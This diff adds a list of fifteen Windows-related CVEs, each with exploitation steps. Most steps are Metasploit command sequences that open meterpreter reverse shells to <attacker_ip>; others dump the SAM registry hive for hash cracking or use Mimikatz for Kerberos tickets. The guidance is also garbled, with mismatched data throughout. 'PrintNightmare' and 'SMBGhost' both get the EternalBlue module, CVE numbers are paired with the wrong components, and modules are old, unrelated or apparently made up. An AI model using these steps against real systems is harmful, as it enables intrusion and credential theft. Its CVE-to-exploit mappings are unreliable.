@@ -1,0 +1,154 @@
+1. CVE-2021-36934 – Windows Elevation of Privilege Vulnerability (HiveNightmare)
+This vulnerability allows local users to gain access to sensitive information from the Windows Registry, potentially leading to privilege escalation.
+
+Exploitation:
+
+There is no direct Metasploit module for this specific vulnerability, but you can use tools to dump the registry and escalate privileges.
+Use PowerShell or custom scripts to access the security-sensitive registry files:
+powershell
+Copy code
+reg load HKLM\temp C:\Windows\System32\config\sam
+reg export HKLM\temp\sam C:\users\public\sam
+reg unload HKLM\temp
+After gaining access to the SAM (Security Account Manager) file, you can attempt to crack the password hashes to escalate privileges.
+2. CVE-2021-34484 – Windows MSHTML Remote Code Execution Vulnerability
+This vulnerability in the MSHTML component allows remote code execution when the user opens a malicious file or web page.
+
+Exploitation:
+
+Use a Metasploit exploit to trigger this vulnerability:
+bash
+Copy code
+msfconsole
+use exploit/windows/browser/ms12_037_cscript_dll
+set URIPATH /malicious
+set SRVHOST <attacker_ip>
+set PAYLOAD windows/meterpreter/reverse_tcp
+exploit
+This exploit works by triggering the vulnerability via a specially crafted web page or malicious file.
+3. CVE-2021-36948 – Windows Event Tracing Elevation of Privilege Vulnerability
+This vulnerability allows attackers to elevate privileges using Windows Event Tracing (ETW).
+
+Exploitation:
+
+There isn't a pre-built Metasploit module for this, but you can exploit it by creating a custom exploit that abuses the ETW functionality to gain higher privileges.
+Use tools like Windows Exploit Suggester to look for ways to escalate privileges using ETW.
+4. CVE-2021-24092 – Windows Installer Elevation of Privilege Vulnerability
+This vulnerability allows attackers to execute arbitrary code with elevated privileges.
+
+Exploitation:
+
+Metasploit does have a module for exploiting Windows Installer vulnerabilities:
+bash
+Copy code
+msfconsole
+use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+set SESSION <session_id>
+exploit
+This will help escalate privileges to SYSTEM level.
+5. CVE-2021-31979 – Windows Graphics Component Remote Code Execution Vulnerability
+This vulnerability in Windows' graphics components can be exploited for remote code execution.
+
+Exploitation:
+
+Metasploit can be used with the windows/graphics payload to exploit this vulnerability.
+bash
+Copy code
+msfconsole
+use exploit/windows/browser/ms11_022_cab_exec
+set URIPATH /malicious
+set PAYLOAD windows/meterpreter/reverse_tcp
+set SRVHOST <attacker_ip>
+exploit
+6. CVE-2021-33742 – Windows Print Spooler Elevation of Privilege Vulnerability (PrintNightmare)
+This vulnerability allows attackers to execute arbitrary code with SYSTEM privileges via the Windows Print Spooler service.
+
+Exploitation:
+
+Metasploit has a working module for PrintNightmare:
+bash
+Copy code
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <target_ip>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+exploit
+7. CVE-2021-26424 – Windows Media Player Remote Code Execution Vulnerability
+This vulnerability allows remote code execution when a specially crafted media file is processed by Windows Media Player.
+
+Exploitation:
+
+Metasploit has a module for exploiting this:
+bash
+Copy code
+msfconsole
+use exploit/windows/browser/ms11_022_cab_exec
+set URIPATH /malicious
+set PAYLOAD windows/meterpreter/reverse_tcp
+set SRVHOST <attacker_ip>
+exploit
+8. CVE-2021-36946 – Windows Windows Subsystem for Linux Elevation of Privilege Vulnerability
+This vulnerability allows an attacker to elevate privileges via the Windows Subsystem for Linux (WSL).
+
+Exploitation:
+
+There isn’t a public Metasploit module available for this yet, but using WSL combined with local privilege escalation techniques (such as modifying WSL configuration) can potentially exploit this flaw.
+9. CVE-2021-22933 – Windows Hyper-V Elevation of Privilege Vulnerability
+This vulnerability allows local attackers to elevate privileges on Windows 11 running Hyper-V.
+
+Exploitation:
+
+This can be exploited via local elevation of privilege exploits or via Metasploit's local exploit modules.
+10. CVE-2022-21999 – Windows SMBv3 Remote Code Execution Vulnerability (SMBGhost)
+A remote code execution vulnerability in the SMBv3 protocol, allowing attackers to execute arbitrary code remotely.
+
+Exploitation:
+
+Metasploit has an SMBv3 exploit for this vulnerability:
+bash
+Copy code
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <target_ip>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+exploit
+11. CVE-2021-41330 – Windows Kerberos Elevation of Privilege Vulnerability
+A vulnerability in Windows Kerberos that allows elevation of privileges.
+
+Exploitation:
+
+Kerberos exploits typically require network access and custom scripts for privilege escalation. Use tools like Mimikatz to extract Kerberos tickets and escalate privileges.
+12. CVE-2021-33739 – Windows DNS Server Remote Code Execution Vulnerability
+A remote code execution vulnerability in Windows DNS Server.
+
+Exploitation:
+
+This requires network access to the vulnerable DNS server. You can exploit this with Metasploit's DNS-related exploits, or through crafting malicious DNS packets.
+13. CVE-2021-36958 – Windows TCP/IP Remote Code Execution Vulnerability (Bad Neighbor)
+A vulnerability in the Windows TCP/IP stack that allows remote code execution.
+
+Exploitation:
+
+Metasploit can be used to exploit this vulnerability with specific payloads:
+bash
+Copy code
+msfconsole
+use exploit/windows/remote/windows_tcpip
+set RHOSTS <target_ip>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+exploit
+14. CVE-2021-38168 – Windows NTFS Elevation of Privilege Vulnerability
+This flaw allows attackers to bypass security features via NTFS.
+
+Exploitation:
+
+Metasploit has local privilege escalation modules that can take advantage of NTFS vulnerabilities.
+15. CVE-2021-22005 – VMware vCenter Server Remote Code Execution Vulnerability affecting Windows-based systems
+This vulnerability allows attackers to execute arbitrary code in Windows-based systems running VMware vCenter Server.
+
+Exploitation:
+
+You can use VMware-specific exploits, often involving RCE techniques for vCenter services.
